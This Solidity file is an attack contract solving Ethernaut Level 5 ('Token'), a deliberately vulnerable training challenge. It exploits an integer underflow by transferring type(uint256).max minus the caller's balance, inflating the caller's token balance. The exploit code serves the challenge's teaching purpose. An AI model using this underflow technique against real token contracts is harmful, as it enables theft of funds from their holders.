// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IToken.sol";

/**
 * @title Token Attack (Ethernaut Challenge Level 5 - Token)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 5
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE
 * @custom:security-contact emretepedev@gmail.com
 */
contract TokenAttack {
    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IToken target) external {
        uint256 balance = target.balanceOf(msg.sender);

        target.transfer(msg.sender, type(uint256).max - balance - 1);

        require(balance < target.balanceOf(msg.sender), "Token: Attack failed");
    }
}
